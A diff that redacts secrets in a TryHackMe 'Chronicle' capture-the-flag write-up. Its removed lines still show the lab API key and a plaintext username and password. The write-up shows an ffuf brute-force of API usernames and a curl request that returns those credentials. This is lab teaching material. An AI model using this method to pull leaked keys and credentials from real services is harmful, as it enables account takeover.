@@ -191,9 +191,9 @@ And next looking into the file we got _key_
 	┌──(arundhanush㉿kali)-[~/…/THM/chronicle/10.10.101.255/old]
 	└─$ less paths | grep key
 	-    xhttp.send('{"key":"NULL"}')       //Removed the API Key to stop the forget password functionality 
-	-    if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
+	-    if(data['key']=='7454cxxxxxxxxxxxxxxxxxxxxxxbc7ef'):
 	-    if(data['key']=='abcd'):
-	+    if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
+	+    if(data['key']=='7454cxxxxxxxxxxxxxxxxxxxxxxbc7ef'):
 	+    xhttp.send('{"key":"NULL"}')       //Removed the API Key to stop the forget password functionality 
 	+    if(data['key']=='abcd'):
 
@@ -214,7 +214,7 @@ Origin: http://10.10.89.35:8081
 Connection: close
 Referer: http://10.10.89.35:8081/forgot?
 
-{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}
+{"key":"7454cxxxxxxxxxxxxxxxxxxxxxxbc7ef"}
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -236,7 +236,7 @@ Payload
 
 ```bash
 ffuf -w /opt/Seclists/Usernames/Names/names.txt -u http://10.10.120.54:8081/api/FUZZ -X POST -H "Content-Type: application/json" \
-      -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -fr "error" -fs 16
+      -d '{"key":"toxxxy"}' -fr "error" -fs 16
 ```
 its takes a time, I used that time to brush my teeth :D. 
 
@@ -244,7 +244,7 @@ its takes a time, I used that time to brush my teeth :D.
 :: Progress: [9418/10164] Job [1/1] 21 req/sec Duration: [0:07:22]
 :: Progress: [9418/10164] Job [1/1] 21 req/sec Duration: [0:07:22]
 :: Progress: [9418/10164] Job [1/1] 21 req/sec Duration: [0:07:22] 
-tommy                   [Status: 200, Size: 49, Words: 1, Lines: 1 
+toxxxy                   [Status: 200, Size: 49, Words: 1, Lines: 1 
 :: Progress: [9419/10164] Job [1/1] 21 req/sec Duration: [0:07:23]
 :: Progress: [9429/10164] Job [1/1] 20 req/sec Duration: [0:07:23] 
 :: Progress: [9429/10164] Job [1/1] 20 req/sec Duration: [0:07:23]
@@ -253,11 +253,10 @@ tommy                   [Status: 200, Size: 49, Words: 1, Lines: 1
 Yeah, got it lets send the request with curl
 
 ```bash
-curl -X POST http://10.10.120.54:8081/api/tommy -H "Content-Type: application/json" -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}'
+curl -X POST http://10.10.120.54:8081/api/toxxxy -H "Content-Type: application/json" -d '{"key":"7454cxxxxxxxxxxxxxxxxxxxxxxbc7ef"}'
 
-{"username":"tommy","password":"DevMakesStuff01"}
+{"username":"toxxxy","password":"Devxxxxxxxx01"}
 ```
-
 We got password successfully. Then what ssh get user.txt
 
 ## PrivESC
